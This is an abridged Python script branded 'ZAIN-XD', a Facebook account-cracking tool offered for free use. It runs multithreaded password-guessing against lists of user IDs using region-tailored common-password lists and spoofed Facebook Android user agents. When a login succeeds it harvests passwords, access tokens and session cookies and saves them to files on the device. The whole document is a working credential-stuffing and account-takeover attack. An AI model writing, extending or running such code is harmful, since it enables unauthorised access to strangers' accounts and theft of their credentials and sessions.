...
os.system('clear')
os.system('xdg-open https://www.facebook.com/profile.php?id=100023907097380')
print('\n\n Loading Module... \n')
...
def clear():
	...
	print(logo)
logo=("""\033[1;37m
   d88888D  .d8b.  d888888b d8b   db      
   YP  d8' d8' `8b   `88'   888o  88      
      d8'  88ooo88    88    88V8o 88      
     d8'   88~~~88    88    88 V8o88      
    d8' db 88   88   .88.   88  V888      
   d88888P YP   YP Y888888P VP   V8P 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Author   :  Zain
  Status   :  Free
...
def file():
	...
	with tred(max_workers=20) as ZAIN:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if mthd =='1':
				ZAIN.submit(m3,ids,names,passlist,fbcr)
			elif mthd =='2':
				ZAIN.submit(m3,ids,names,passlist,fbcr)
			elif mthd =='3':
				ZAIN.submit(m3,ids,names,passlist,fbcr)
	...
	with tred(max_workers=15) as khan:
		...
		for psx in user:
			...
			#	passlist = [psx,ids,'khankhan','kingkhan','khan1122']
				...
				passlist = ['i love you','iloveyou','free fire','freefire','57273200',ids,psx]
			elif 'ind' in ck:
				cs = ids[7:]
				passlist = ['i love you','iloveyou','free fire','freefire','57273200',cs]
			elif 'afg' in ck:
				...
				passlist = [ids,psx,'khankhan123','57273200','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak123','ali123','ali12345','ali786','ali123456','jan jan','baloch','baloch123','khan1122','khan12','i love you','iloveyou','janjan']
			khan.submit(rd,ids,passlist,fbcr)
	print('\033[1;37m')
	line()
	print(' The process has completed')
...
def m3(ids,names,passlist,fbcr):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [ZAIN-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			ua = 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Robi;FBMF/POSH;FBBD/POSH;FBPN/com.facebook.katana;FBDV/Memo Pro LTE L600;FBSV/'+fbsv+';nullFBCA/armeabi-v7a:armeabi;]'.replace('\n','')
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [ZAIN-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ZAIN/ZAIN-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/ZAIN/ZAIN-FILE-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	...
	try:
		...
		for pas in passlist:
			...
			if "session_key" in po:
				uid = str(po['uid'])
				token = po['access_token']
				print('\r\r\033[1;32m [ZAIN-OK] '+uid+' | '+pas)
				oks.append(ids)
				open('/sdcard/ZAIN/ZAIN-R-OK.txt','a').write(uid+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ZAIN/ZAIN-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
